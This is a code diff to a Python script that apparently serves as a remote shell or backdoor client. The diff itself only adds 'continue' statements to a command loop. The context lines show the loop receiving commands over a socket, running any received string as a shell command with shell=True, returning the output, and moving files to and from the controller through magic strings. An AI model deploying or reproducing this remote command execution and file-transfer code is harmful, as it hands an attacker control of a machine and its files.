@@ -42,6 +42,7 @@ def deptor(s):
             os.chdir(data[3:].decode("utf-8"))
             currentWD = os.getcwd() + "> "
             sender(s,currentWD)
+            continue
         elif data.decode() == 'exitu':
             quit()
         elif data.decode() == 'filetransferfromu12344':
@@ -54,6 +55,7 @@ def deptor(s):
             s.send(arr)
             file.close()
             del arr,file,path
+            continue
         elif data.decode() == 'filetransferfromus12344':
             t_p = receiver(s)
             
@@ -64,12 +66,14 @@ def deptor(s):
             fil.write(ar)
             fil.close()
             del fil,ar,t_p
+            continue
         elif len(data) > 0:
             cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
             output_byte = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_byte,"utf-8")
             currentWD = os.getcwd() + "> "
             sender(s,output_str + currentWD)
+            continue
 def security(s):
     sender(s,send_password)
     rec = receiver(s)
